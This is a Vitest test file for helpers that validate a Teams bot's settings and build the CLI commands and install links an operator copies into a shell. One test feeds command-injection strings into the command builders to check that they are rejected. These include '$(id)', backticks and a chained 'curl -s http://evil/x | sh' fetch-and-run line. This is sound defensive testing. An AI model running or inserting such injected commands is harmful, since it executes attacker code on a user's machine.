import { describe, expect, it } from 'vitest'
import {
  LOCAL_TEAMS_ENDPOINT_ORIGIN,
  TEAMS_APP_NAME_MAX_LENGTH,
  buildTeamsAppCreateCommand,
  buildTeamsPackageDownloadCommand,
  buildTeamsSupportsFilesCommand,
  canGenerateTeamsCommand,
  teamsAppNameError,
  teamsInstallUrl,
  teamsPlaceholderEndpoint,
} from '../teamsSetup'

describe('canGenerateTeamsCommand', () => {
  it('accepts an absolute https URL', () => {
    expect(canGenerateTeamsCommand('https://webhook.dev.example.com/webhooks/teams/x')).toBe(true)
  })

  it('rejects an http origin, which Microsoft cannot use as a messaging endpoint', () => {
    // Mirrored from the Slack helper, which accepts http. Teams requires a
    // publicly reachable HTTPS endpoint, so an http origin has to render the
    // invalid-origin warning rather than a command that registers a dead bot.
    expect(canGenerateTeamsCommand('http://webhook.dev.example.com/webhooks/teams/x')).toBe(false)
  })

  it('rejects a bare path, which is what a non-app deployment produces', () => {
    expect(canGenerateTeamsCommand('/webhooks/teams/x')).toBe(false)
  })

  it('rejects null', () => {
    expect(canGenerateTeamsCommand(null)).toBe(false)
  })
})

describe('teamsPlaceholderEndpoint', () => {
  it('prefixes a bare path with the marker origin', () => {
    expect(teamsPlaceholderEndpoint('/webhooks/teams/x')).toBe(
      `${LOCAL_TEAMS_ENDPOINT_ORIGIN}/webhooks/teams/x`
    )
  })

  it('drops the origin of a rejected http URL instead of concatenating onto it', () => {
    // Now that canGenerateTeamsCommand rejects http, this branch also receives
    // ABSOLUTE urls. Concatenation would render
    // https://<public-webhook-origin>http://webhook.example.com/webhooks/teams/x.
    expect(teamsPlaceholderEndpoint('http://webhook.example.com/webhooks/teams/x')).toBe(
      `${LOCAL_TEAMS_ENDPOINT_ORIGIN}/webhooks/teams/x`
    )
  })
})

describe('teamsAppNameError', () => {
  it('accepts a free-form display name with spaces and capitals', () => {
    // The CRD declares appName with no pattern and control-api checks only
    // emptiness and length, so this is a legitimate stored value.
    expect(teamsAppNameError('My Bot')).toBeNull()
  })

  it('accepts a kebab-cased name too', () => {
    expect(teamsAppNameError('evenfire-bot')).toBeNull()
  })

  it('rejects an empty name', () => {
    expect(teamsAppNameError('')).toBe('Teams bot name is required.')
    expect(teamsAppNameError('   ')).toBe('Teams bot name is required.')
  })

  it('accepts a name of exactly the server limit', () => {
    expect(teamsAppNameError('a'.repeat(TEAMS_APP_NAME_MAX_LENGTH))).toBeNull()
  })

  it('rejects a name past the server limit', () => {
    expect(teamsAppNameError('a'.repeat(TEAMS_APP_NAME_MAX_LENGTH + 1))).toBe(
      'Teams bot name must be 80 characters or fewer.'
    )
  })
})

describe('buildTeamsAppCreateCommand', () => {
  it('renders the command with the bot name and endpoint', () => {
    const cmd = buildTeamsAppCreateCommand({
      botName: 'evenfire-bot',
      endpoint: 'https://webhook.dev.example.com/webhooks/teams/x',
    })
    expect(cmd).toContain('--name "evenfire-bot"')
    expect(cmd).toContain('--endpoint "https://webhook.dev.example.com/webhooks/teams/x"')
    expect(cmd).toContain('--env .env')
  })

  it('quotes a display name with spaces, so it survives as one argument', () => {
    const cmd = buildTeamsAppCreateCommand({
      botName: 'My Bot',
      endpoint: 'https://webhook.dev.example.com/webhooks/teams/x',
    })
    expect(cmd).toContain('--name "My Bot"')
  })
})

describe('buildTeamsAppCreateCommand sign-in audience', () => {
  it('pins the single-tenant audience, because channel-reader uses a tenant-scoped token URL', () => {
    const cmd = buildTeamsAppCreateCommand({
      botName: 'Evenfire Bot',
      endpoint: 'https://webhook.example.com/webhooks/teams/x',
    })
    expect(cmd).toContain('--sign-in-audience myOrg')
  })
})

describe('buildTeamsSupportsFilesCommand', () => {
  it('includes --yes, without which the update silently does nothing', () => {
    // A real UUID: the builder now falls back to the placeholder for anything
    // else, so 'abc-123' would no longer exercise the interpolation path.
    const appId = '0cd0e1e6-adf7-40f4-952f-79006d320a05'
    expect(buildTeamsSupportsFilesCommand(appId)).toBe(
      `teams app manifest update ${appId} --set-json 'bots[0].supportsFiles=true' --yes`
    )
  })

  it('falls back to a placeholder app id', () => {
    // Never an angle-bracket placeholder: `<appId>` is a redirect in sh and zsh,
    // so pasting the command unedited fails with "no such file or directory".
    const cmd = buildTeamsSupportsFilesCommand()
    expect(cmd).toContain('YOUR_CLIENT_ID')
    expect(cmd).not.toContain('<')
    expect(cmd).not.toContain('>')
  })
})

describe('teamsInstallUrl', () => {
  const APP = '0cd0e1e6-adf7-40f4-952f-79006d320a05'
  const TENANT = '18517e81-9d09-4c73-88f3-e84a6c90c3d9'

  it('builds the deep link from the two ids already on the form', () => {
    expect(teamsInstallUrl(APP, TENANT)).toBe(
      `https://teams.microsoft.com/l/app/${APP}?installAppPackage=true&appTenantId=${TENANT}`
    )
  })

  it('returns null until both ids are real UUIDs, so no half-built link is offered', () => {
    expect(teamsInstallUrl('', TENANT)).toBeNull()
    expect(teamsInstallUrl(APP, '')).toBeNull()
    expect(teamsInstallUrl('not-a-uuid', TENANT)).toBeNull()
    expect(teamsInstallUrl(APP, 'not-a-uuid')).toBeNull()
  })

  it('trims, since pasted ids often carry whitespace', () => {
    // toContain(APP) would pass on a URL that still carried the surrounding
    // spaces, since APP is a substring of the padded value. Only an exact match
    // proves the href is actually resolvable.
    expect(teamsInstallUrl(`  ${APP} `, ` ${TENANT}  `)).toBe(
      `https://teams.microsoft.com/l/app/${APP}?installAppPackage=true&appTenantId=${TENANT}`
    )
  })
})

describe('command builders reject a non-UUID app id', () => {
  const APP = '0cd0e1e6-adf7-40f4-952f-79006d320a05'

  // These commands are rendered live from the CLIENT_ID field and handed to a
  // Copy button, and the operator pastes them into a shell. The field is free
  // text until submit, and the value is often pasted from whoever ran
  // `teams app create`. teamsInstallUrl already refuses a non-UUID; these two
  // trusted the same field blindly.
  it.each([
    ['command substitution', '$(id)'],
    ['a chained command', 'abc; curl -s http://evil/x | sh'],
    ['backticks', '`id`'],
    ['a half-typed id', '0cd0e1e6'],
  ])('falls back to the placeholder for %s', (_label, hostile) => {
    for (const cmd of [
      buildTeamsSupportsFilesCommand(hostile),
      buildTeamsPackageDownloadCommand(hostile),
    ]) {
      expect(cmd).toContain('YOUR_CLIENT_ID')
      expect(cmd).not.toContain(hostile)
      expect(cmd).not.toMatch(/[;`$|]/)
    }
  })

  it('still emits a real UUID unchanged', () => {
    expect(buildTeamsSupportsFilesCommand(APP)).toBe(
      `teams app manifest update ${APP} --set-json 'bots[0].supportsFiles=true' --yes`
    )
    expect(buildTeamsPackageDownloadCommand(APP)).toBe(`teams app package download ${APP}`)
  })

  it('trims a padded UUID rather than rejecting it', () => {
    expect(buildTeamsPackageDownloadCommand(`  ${APP}  `)).toBe(`teams app package download ${APP}`)
  })
})
